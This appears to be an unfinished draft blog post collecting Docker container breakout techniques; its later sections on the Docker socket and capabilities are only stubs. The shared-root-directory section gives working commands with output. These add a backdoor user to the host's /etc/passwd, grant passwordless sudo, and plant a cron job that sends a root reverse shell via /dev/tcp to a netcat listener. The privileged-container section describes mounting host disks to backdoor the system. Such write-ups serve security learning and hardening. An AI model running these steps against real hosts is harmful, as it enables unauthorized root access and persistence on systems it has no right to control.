---
title: "Container Breakouts Techniques"
date: 2020-07-11T13:09:54+02:00
draft: true
---

Basic Container Breakouts
## Intro
The motivation of this post is to collect container breakouts. I was considering writing a huge post about all the stuff you must know to break out of container. But, if I would do so, it will take ages to write, es well to read and at the end you would just scroll direct to the PoC code snippets. So I dropped that idea and will just link to additional readings.

It may the case that not all breakouts that you have in mind are listed. Do not hesitate and contact me so that I can add them. Over the time, I may extend them as well.

## Attacks
The attacks refer to each other, cause the root-cause why an attack is possible may differ, but the final break out may be the same. The examples are related to docker. The transfer to other container technologies, e.g., LXC may be slightly different and maybe there will be a follow-up post regarding this ;)

### Shared Host root-directory

If you got access to a container that shares directories with the host, that is not direct a problem. But, if the container has access to the host root-filesystem as user root (pre-assumed that there is no [AppArmor](https://man.cx/apparmor(7)) or [SELinux](https://man7.org/linux/man-pages/man8/selinux.8.html) in place) you got the jack pot! We have multiple ways to approach the underlying host.
Lets assume that the host root directory is accessible at `/hostfs`

#### SSH to user

To escalate to the host, we create a user in the file `/hostfs/etc/passwd` and add the user to the sudoer’s. After the user is prepared, we connect via SSH to the host. Okay, it is a kind of flaky, because certain packages must have been installed and services running, you get the idea :)

```bash 
# cat /hostfs/etc/passwd | grep 1000
user:x:1000:1000::/home/user:/bin/bash
# openssl passwd -6 -salt xyz test
$6$xyz$rjarwc/BNZWcH6B31aAXWo1942.i7rCX5AT/oxALL5gCznYVGKh6nycQVZiHDVbnbu0BsQyPfBgqYveKcCgOE0
# echo 'foo:$6$xyz$rjarwc/BNZWcH6B31aAXWo1942.i7rCX5AT/oxALL5gCznYVGKh6nycQVZiHDVbnbu0BsQyPfBgqYveKcCgOE0:1000:1001:user:/home/user:/usr/bin/zsh' | tee -a /hostfs/etc/passwd
# echo "user ALL=(ALL) NOPASSWD: ALL" >> /hostfs/etc/sudoers.d/0-user
# ip r 
default via 172.17.0.1 dev eth0 
172.17.0.0/16 dev eth0 proto kernel scope link src 172.17.0.2
# ssh -l foo 127.0.0.1
foo@127.0.0.1's password: 
Last login: Sat Jul 11 12:10:10 2020 from 127.0.0.1
arch [~]% sudo -i
[arch ~]# 
```

We have assumed that there is a SSH daemon running on the host, the service is not hardened and the `sudo` package was installed. Well, you could exchange the sudo step by creating another user with uid 0 to get rid of that step, nut anyway ;)

#### Cronjob

Another approach would be to write a cronjob file that get triggered every minute and connects to our container as root user.

```bash 
# ip a
[…]
6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
[…]

# echo "* * * * * root bash -i >& /dev/tcp/172.17.0.2/1337 0>&1" | tee /hostfs/etc/cron.d/1revers
# nc -lkvp 1337
nc -lvkp 1337
listening on [any] 1337 ...
172.17.0.1: inverse host lookup failed: Unknown host
connect to [172.17.0.2] from (UNKNOWN) [172.17.0.1] 58536
bash: cannot set terminal process group (3138): Inappropriate ioctl for device
bash: no job control in this shell
[arch ~]# id -a
uid=0(root) gid=0(root) groups=0(root)
```

In this second showcase, we assumed that a cron service was running on the host. That is more or less the default on a lot of systems. 


### Privileged Container
If you start a container with Docker and you add the flag `--privileged` that means to the process in the container can act as root user on the host. The containerization would have the advantage of self-containing software shipment, but no real security boundaries to the kernel.
There are plenty ways to escape from a privileged container. Let’s have a start.

#### Host devices

I prefer to use the host devices to escape from a privileged container. A quick directory listing of the devices in the container shows that we have access to all of them:

```bash
root@0462216e684b:~# ls -l /dev/
total 0
crw-r--r-- 1 root root  10, 235 Jul 11 09:20 autofs

[...]

brw-rw---- 1 root  994   8,   0 Jul 11 09:20 sda
brw-rw---- 1 root  994   8,   1 Jul 11 09:20 sda1

[...]
```
As you can see, the hard drive itself is listed, which can be mounted. After mounting the device, it is possible to interact as root user with the device and backdoor the system.
Getting access via the hard drive is already described in the previous section [Shared Host root-directory](#shared-host-root-directory).


#### cgroups
TODO … have to read :D

### Docker Socket

Finde Docker Socket
Starte privileged Container

### Capabilities

#### `CAP_SYS_Module` – Load Kernel Module 





